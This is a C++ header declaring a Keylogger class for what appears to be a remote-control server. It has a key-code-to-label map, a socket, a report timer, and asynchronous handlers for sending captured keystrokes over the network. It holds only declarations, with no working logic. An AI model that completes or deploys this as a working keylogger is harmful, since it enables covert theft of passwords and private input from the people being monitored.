
#ifndef KEYBOARD_LOGGER_HPP
#define KEYBOARD_LOGGER_HPP

#include <boost/noncopyable.hpp>

#include "task_handler_interface.h"
#include "hardware.hpp"

using namespace std;

namespace http {
	namespace server {

		static std::map<int, std::string> cor =
		{
			{ 8, "[BACKSPACE]" },{ 27, "[ESC]" },
			{ 33, "[Page Up]" },{ 34, "[Page Down]" },
			{ 35, "[END]" },{ 36, "[HOME]" },
			{ 37, "[Arrow Left]" },{ 38, "[Arrow Up]" },
			{ 39, "[Arrow Right]" },{ 40, "[Arrow Down]" },
			{ 45, "[INSERT]" },{ 46, "[DELETE]" },
			{ 91, "[L Windows Key]" },{ 92, "[R Windows Key]" },
			{ 93, "[R Menu]" },{ 144, "[NUM LOCK]" },
			{ 222, "[ACUTE/CEDILLA]" }
		};

		class Keylogger: public TaskHandlerInterface, private boost::noncopyable
		{
			public:

				explicit Keylogger(ip::tcp::socket& sock, io_service& io_ref);

			    void start();

				void stop();
				
				void listen_for_report_data();

				void on_keylog_report_timer_elapsed(const boost::system::error_code& error);

				void handle_async_write_report(const boost::system::error_code& error, std::size_t bytes);

				bool execute(std::shared_ptr<request> req) override;

			private:
			
				bool isStarted = false;

				deadline_timer keylog_report_timer;

				std::shared_ptr<reply>	 _reply_buffer_ptr;
				std::shared_ptr<request> _request_buffer_ptr;
		};
	}
}

#endif //KEYBOARD_LOGGER_HPP